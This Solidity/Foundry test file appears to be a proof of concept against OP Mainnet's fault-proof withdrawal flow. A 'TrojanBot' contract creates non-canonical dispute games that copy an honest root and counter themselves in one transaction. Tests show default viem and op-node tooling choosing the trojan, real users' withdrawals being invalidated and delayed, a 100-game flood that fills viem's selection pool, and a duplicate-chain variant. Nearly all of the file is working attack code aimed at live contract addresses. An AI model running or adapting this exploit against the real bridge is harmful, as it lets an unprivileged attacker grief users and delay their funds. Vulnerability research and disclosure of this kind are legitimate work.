// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import "forge-std/Test.sol";
import "./Ifaces.sol";

/// Attacker contract: creates the trojan and counters its own root in the SAME transaction, so the
/// attacker (not the honest challenger) is the first and only counter-claimant of the root.
contract TrojanBot {
    IDGF immutable dgf;
    address immutable owner;
    constructor(IDGF _dgf) { dgf = _dgf; owner = msg.sender; }
    function strike(bytes calldata extra, bytes32 counter) external payable returns (address g, uint256 idx) {
        require(msg.sender == owner);
        idx = dgf.gameCount();
        g = dgf.create{ value: dgf.initBonds(9) }(9, keccak256(extra), extra);
        IGame(g).attack{ value: IGame(g).getRequiredBond(2) }(keccak256(extra), 0, counter);
    }
    function collect(address g) external { IGame(g).claimCredit(address(this)); }
    function sweep() external { payable(owner).transfer(address(this).balance); }
    receive() external payable {}
}

/// ATK-D: trojan super-root game vs the OFFICIAL default withdrawal tooling, OP Mainnet, deployed
/// post-U21 bytecode (`l1` fork @ 26433900). Victim withdrawals: 3 real L2StandardBridge ETH
/// withdrawals that the production auto-prover 0x431f…ddf5 proved (txs in victims.json); proofs at
/// the newest honest game's timestamp rebuilt from the OP archive exactly as viem buildProveWithdrawal does.
contract AtkDTrojanTest is Test {
    IPortal constant PORTAL = IPortal(0xbEb5Fc579115071764c7423A4f12eDde41f106Ed);
    IASR constant ASR = IASR(0x23B2C62946350F4246f9f9D027e071f0264FD113);
    IDGF constant DGF = IDGF(0xe5965Ab5962eDc7477C8520243A95517CD252fA9);
    address constant AUTOPROVER = 0x431f5015b7C05Fe792aeA2A05158919aF1E8Ddf5;
    uint256 constant HONEST_IDX = 21388; // newest type-9 game at the fork block (official proposer cadence ~1h)
    bytes4 constant E_INVALID_ROOT = bytes4(keccak256("OptimismPortal_InvalidRootClaim()"));
    bytes4 constant E_UNPROVEN = bytes4(keccak256("OptimismPortal_Unproven()"));
    bytes4 constant E_NOT_INVALIDATED = bytes4(keccak256("OptimismPortal_DisputeGameNotInvalidated()"));
    bytes4 constant E_NOT_OLD = bytes4(keccak256("OptimismPortal_ProofNotOldEnough()"));
    bytes4 constant E_BAD_ORP = bytes4(keccak256("OptimismPortal_InvalidOutputRootProof()"));

    address attacker = makeAddr("attacker");
    address viemUser = makeAddr("viemUser"); // any prover whose client uses the default "latest" selection
    address rando = makeAddr("rando");

    WithdrawalTransaction[] wtx;
    bytes32[] whs;
    OutputRootProof[] orps;
    bytes[][] wproofs;
    WithdrawalTransaction fw; bytes32 fwh; OutputRootProof forp; bytes[] fproof; uint256 fts;
    uint256 minSeq; // timestamp covered by the game the auto-prover actually used (21314) >= every withdrawal's L2 ts

    function setUp() public {
        vm.createSelectFork("l1");
        vm.deal(attacker, 10 ether);
        string memory v = vm.readFile("victims.json");
        string memory p = vm.readFile("proofs_21388.json");
        for (uint256 k; k < 3; k++) {
            string memory key = string.concat(".", vm.toString(k));
            bytes memory input = vm.parseJsonBytes(v, string.concat(key, ".input"));
            bytes memory body = new bytes(input.length - 4);
            for (uint256 i; i < body.length; i++) body[i] = input[i + 4];
            (WithdrawalTransaction memory w,,,) = abi.decode(body, (WithdrawalTransaction, uint256, OutputRootProof, bytes[]));
            wtx.push(w);
            bytes32 wh = keccak256(abi.encode(w.nonce, w.sender, w.target, w.value, w.gasLimit, w.data));
            assertEq(wh, vm.parseJsonBytes32(v, string.concat(key, ".wh")));
            whs.push(wh);
            orps.push(OutputRootProof(bytes32(0), vm.parseJsonBytes32(p, string.concat(key, ".stateRoot")),
                vm.parseJsonBytes32(p, string.concat(key, ".storageRoot")), vm.parseJsonBytes32(p, string.concat(key, ".blockHash"))));
            wproofs.push(vm.parseJsonBytesArray(p, string.concat(key, ".proof")));
        }
        string memory f = vm.readFile("fresh.json");
        fw = WithdrawalTransaction(vm.parseJsonUint(f, ".nonce"), vm.parseJsonAddress(f, ".sender"), vm.parseJsonAddress(f, ".target"),
            vm.parseJsonUint(f, ".value"), vm.parseJsonUint(f, ".gasLimit"), vm.parseJsonBytes(f, ".data"));
        fwh = vm.parseJsonBytes32(f, ".wh");
        assertEq(fwh, keccak256(abi.encode(fw.nonce, fw.sender, fw.target, fw.value, fw.gasLimit, fw.data)));
        forp = OutputRootProof(bytes32(0), vm.parseJsonBytes32(f, ".stateRoot"), vm.parseJsonBytes32(f, ".storageRoot"), vm.parseJsonBytes32(f, ".blockHash"));
        fproof = vm.parseJsonBytesArray(f, ".proof");
        fts = vm.parseJsonUint(f, ".l2ts");
        (,, address g21314) = DGF.gameAtIndex(21314);
        minSeq = IGame(g21314).l2SequenceNumber();
    }

    // ---- faithful re-implementations of the official selectors (read-only) ----
    /// viem 2.58.0 op-stack getGames: findLatestGames(respected, count-1, 100), keep l2SequenceNumber >= l2Timestamp.
    /// waitToProve -> waitForNextGame -> getGame(strategy 'random') draws UNIFORMLY from this pool (docs-default
    /// prove flow); getGame's default strategy 'latest' returns pool[0]. No root / status / canonicality check.
    function viemPool(uint256 l2Ts) internal view returns (uint256[] memory pool) {
        uint256 n = DGF.gameCount();
        GameSearchResult[] memory gs = DGF.findLatestGames(PORTAL.respectedGameType(), n - 1, 100);
        pool = new uint256[](gs.length);
        uint256 m;
        for (uint256 i; i < gs.length; i++) {
            if (IGame(address(uint160(uint256(gs[i].metadata)))).l2SequenceNumber() >= l2Ts) pool[m++] = gs[i].index;
        }
        assembly { mstore(pool, m) }
    }
    function viemSelect(uint256 l2Ts) internal view returns (uint256) {
        uint256 n = DGF.gameCount();
        GameSearchResult[] memory gs = DGF.findLatestGames(PORTAL.respectedGameType(), n - 1, 100);
        for (uint256 i; i < gs.length; i++) {
            if (IGame(address(uint160(uint256(gs[i].metadata)))).l2SequenceNumber() >= l2Ts) return gs[i].index;
        }
        revert("GameNotFoundError");
    }
    /// monorepo op-node/withdrawals/utils.go findLatestWithdrawalGameCandidate + :169 output-root check.
    function opnodeSelect(uint256 l2Ts, bytes32 provenOutputRoot) internal view returns (uint256) {
        uint256 n = DGF.gameCount();
        GameSearchResult[] memory gs = DGF.findLatestGames(9, n - 1, 32);
        for (uint256 i; i < gs.length; i++) {
            bytes memory e = gs[i].extraData;
            uint64 ts; assembly { ts := shr(192, mload(add(e, 33))) }
            for (uint256 j = 9; j + 64 <= e.length; j += 64) {
                uint256 cid; bytes32 r;
                assembly { cid := mload(add(add(e, 32), j)) r := mload(add(add(e, 64), j)) }
                if (cid == 10) {
                    if (ts >= l2Ts) {
                        require(r == provenOutputRoot, "output root mismatch");
                        return gs[i].index;
                    }
                    break;
                }
            }
        }
        revert("no dispute game covers withdrawal");
    }
    function _orpHash(OutputRootProof memory o) internal pure returns (bytes32) {
        return keccak256(abi.encode(o.version, o.stateRoot, o.messagePasserStorageRoot, o.latestBlockhash));
    }
    function _game(uint256 i) internal view returns (IGame g) { (,, address a) = DGF.gameAtIndex(i); g = IGame(a); }

    function test_trojan_vs_default_tooling_end_to_end() public {
        IGame honest = _game(HONEST_IDX);
        bytes memory hx = honest.extraData();
        bytes32 R = honest.rootClaimByChainId(10);
        assertEq(_orpHash(orps[0]), R, "proof rebuilt from L2 archive == honest chain-10 root");

        // pre: both official selectors pick the honest newest game
        assertEq(viemSelect(minSeq), HONEST_IDX);
        assertEq(opnodeSelect(minSeq, R), HONEST_IDX);

        // ATTACK (one tx, unprivileged): copy the honest proposal, append one junk tuple, counter own root
        vm.startPrank(attacker);
        TrojanBot bot = new TrojanBot(DGF);
        for (uint256 k; k < 3; k++) assertFalse(PORTAL.finalizedWithdrawals(whs[k]), "victim withdrawal pending at fork");
        uint256 balBefore = attacker.balance;
        uint256 g0 = gasleft();
        (address tg, uint256 tIdx) = bot.strike{ value: 0.2 ether }(abi.encodePacked(hx, uint256(999), keccak256("junk")), bytes32(uint256(0xc0ffee)));
        console.log("strike gas (create + same-tx counter)", g0 - gasleft());
        bot.sweep();
        vm.stopPrank();
        IGame trojan = IGame(tg);
        uint256 locked = balBefore - attacker.balance;
        console.log("attacker capital locked (wei)", locked);
        assertTrue(trojan.wasRespectedGameTypeWhenCreated());
        assertEq(trojan.l2SequenceNumber(), honest.l2SequenceNumber());
        assertEq(trojan.rootClaimByChainId(10), R);
        assertTrue(trojan.rootClaim() != honest.rootClaim());

        // post: op-node/op-chain-ops CLI (latest + root check) deterministically returns the trojan;
        // viem 'latest' returns it; viem 'random' (docs flow) for the fresh withdrawal draws from {trojan, 21388, 21387}
        assertEq(viemSelect(minSeq), tIdx);
        assertEq(opnodeSelect(minSeq, R), tIdx);
        uint256[] memory pool = viemPool(fts);
        assertEq(pool.length, 3);
        assertEq(pool[0], tIdx);
        console.log("viem random pool size for fresh withdrawal (p_trojan = 1/size)", pool.length);

        // victims prove with honest, unmodified viem-built parameters at the selected index
        vm.warp(block.timestamp + 12);
        uint256 t0 = block.timestamp;
        for (uint256 k; k < 3; k++) {
            vm.prank(viemUser);
            PORTAL.proveWithdrawalTransaction(wtx[k], tIdx, orps[k], wproofs[k]);
            (address g,) = PORTAL.provenWithdrawals(whs[k], viemUser);
            assertEq(g, tg);
        }
        // isolation: the production auto-prover's own good proofs are untouched and not deletable
        for (uint256 k; k < 3; k++) {
            (address g,) = PORTAL.provenWithdrawals(whs[k], AUTOPROVER);
            assertEq(g, address(_game(21314)));
            vm.expectRevert(E_NOT_INVALIDATED);
            vm.prank(rando);
            PORTAL.deleteProvenWithdrawal(whs[k], AUTOPROVER);
        }

        // real moves: nobody counters the attacker's counter-claim; root side clock expires
        vm.warp(block.timestamp + trojan.maxClockDuration() + 1);
        trojan.resolveClaim(1, 0);
        trojan.resolveClaim(0, 0);
        assertEq(trojan.resolve(), 1, "CHALLENGER_WINS");
        // honest game (unchallenged on the fork) resolves for the defender
        honest.resolveClaim(0, 0);
        assertEq(honest.resolve(), 2, "DEFENDER_WINS");

        // viem getWithdrawalStatus inputs: ProofNotOldEnough + proper+respected+not finalized => 'waiting-to-finalize'
        vm.expectRevert(E_NOT_OLD);
        PORTAL.checkWithdrawal(whs[0], viemUser);
        assertTrue(ASR.isGameProper(tg) && ASR.isGameRespected(tg) && !ASR.isGameFinalized(tg));
        // honest path would finalize at t0 + 7d
        vm.warp(t0 + PORTAL.proofMaturityDelaySeconds() + 1);
        vm.expectRevert(E_INVALID_ROOT);
        PORTAL.finalizeWithdrawalTransactionExternalProof(wtx[0], viemUser);
        // once finalized (resolvedAt + 3.5d) viem reports 'ready-to-prove'; anyone deletes the dead proofs
        vm.warp(trojan.resolvedAt() + ASR.disputeGameFinalityDelaySeconds() + 1);
        assertTrue(ASR.isGameFinalized(tg));
        for (uint256 k; k < 3; k++) {
            vm.prank(rando);
            PORTAL.deleteProvenWithdrawal(whs[k], viemUser);
            vm.expectRevert(E_UNPROVEN);
            PORTAL.checkWithdrawal(whs[k], viemUser);
        }
        // victim re-proves against the honest game (only possible if the newest game is not another trojan)
        uint256 t1 = block.timestamp;
        vm.prank(viemUser);
        PORTAL.proveWithdrawalTransaction(wtx[0], HONEST_IDX, orps[0], wproofs[0]);
        vm.warp(t1 + PORTAL.proofMaturityDelaySeconds() + 1);
        PORTAL.finalizeWithdrawalTransactionExternalProof(wtx[0], viemUser);
        assertTrue(PORTAL.finalizedWithdrawals(whs[0]));
        console.log("victim extra delay (s)", t1 - t0);

        // attacker bond recovery: 0.08 (creator bond) + own counter bond, via DelayedWETH
        bot.collect(tg);
        vm.warp(block.timestamp + IDelayedWETH(trojan.weth()).delay() + 1);
        uint256 pre = address(bot).balance;
        bot.collect(tg);
        console.log("attacker recovered (wei)", address(bot).balance - pre);
        assertEq(address(bot).balance - pre, locked);
        assertEq(trojan.bondDistributionMode(), 1, "NORMAL");
        for (uint256 k; k < 3; k++) assertFalse(k > 0 && PORTAL.finalizedWithdrawals(whs[k]));
    }

    /// Negative controls: (a) an exact copy of the honest proposal cannot be created (the trojan must be
    /// non-canonical, hence invalid); (b) a trojan with a WRONG chain-10 root is still picked by viem but the
    /// prove reverts, and the op-node selector errors (tooling DoS only, no proof written).
    function test_negative_controls() public {
        IGame honest = _game(HONEST_IDX);
        bytes memory hx = honest.extraData();
        uint256 bond = DGF.initBonds(9);
        vm.startPrank(attacker);
        vm.expectRevert();
        DGF.create{ value: bond }(9, keccak256(hx), hx);
        bytes memory bad = abi.encodePacked(bytes1(0x01), uint64(honest.l2SequenceNumber()), uint256(10), keccak256("fake"));
        DGF.create{ value: bond }(9, keccak256(bad), bad);
        vm.stopPrank();
        uint256 badIdx = DGF.gameCount() - 1;
        assertEq(viemSelect(minSeq), badIdx);
        vm.warp(block.timestamp + 12);
        vm.prank(viemUser);
        vm.expectRevert(E_BAD_ORP);
        PORTAL.proveWithdrawalTransaction(wtx[0], badIdx, orps[0], wproofs[0]);
        bytes32 hr = honest.rootClaimByChainId(10);
        vm.expectRevert(bytes("output root mismatch"));
        this.extOpnodeSelect(minSeq, hr);
    }
    function extOpnodeSelect(uint256 a, bytes32 b) external view returns (uint256) { return opnodeSelect(a, b); }

    /// Flood: 100 trojans (one honest proposal's worth) push every honest covering game out of viem's 100-game
    /// window, so the docs-default viem 'random' draw selects a trojan with certainty.
    function test_flood_viem_random_pool_all_trojans() public {
        IGame honest = _game(HONEST_IDX);
        bytes memory hx = honest.extraData();
        vm.startPrank(attacker);
        vm.deal(attacker, 20 ether);
        TrojanBot bot = new TrojanBot(DGF);
        uint256 b0 = attacker.balance;
        for (uint256 i; i < 100; i++) {
            bot.strike{ value: 0.2 ether }(abi.encodePacked(hx, uint256(999), keccak256(abi.encode(i))), bytes32(uint256(0xc0ffee)));
        }
        bot.sweep();
        vm.stopPrank();
        console.log("flood capital locked (wei, recoverable if counters are honest)", b0 - attacker.balance);
        uint256[] memory pool = viemPool(fts);
        assertEq(pool.length, 100);
        for (uint256 i; i < pool.length; i++) {
            assertEq(_game(pool[i]).rootClaimByChainId(10), honest.rootClaimByChainId(10));
            assertTrue(_game(pool[i]).rootClaim() != honest.rootClaim());
        }
        // the fresh real withdrawal, built exactly like viem buildProveWithdrawal, proves against any pool member
        uint256 pick = pool[uint256(keccak256("viem Math.random")) % pool.length];
        vm.warp(block.timestamp + 12);
        vm.prank(viemUser);
        PORTAL.proveWithdrawalTransaction(fw, pick, forp, fproof);
        (address g,) = PORTAL.provenWithdrawals(fwh, viemUser);
        assertEq(g, address(_game(pick)));
    }

    /// Duplicate-chain variant and an attacker-chosen unsorted list are also accepted (first match wins).
    function test_duplicate_variant() public {
        IGame honest = _game(HONEST_IDX);
        bytes memory hx = honest.extraData();
        bytes memory dup = abi.encodePacked(hx, uint256(10), keccak256("shadow"));
        vm.prank(attacker);
        address g = DGF.create{ value: DGF.initBonds(9) }(9, keccak256(dup), dup);
        assertEq(IGame(g).rootClaimByChainId(10), honest.rootClaimByChainId(10));
        assertEq(viemSelect(minSeq), DGF.gameCount() - 1);
        vm.warp(block.timestamp + 12);
        vm.prank(viemUser);
        PORTAL.proveWithdrawalTransaction(wtx[1], DGF.gameCount() - 1, orps[1], wproofs[1]);
    }
}
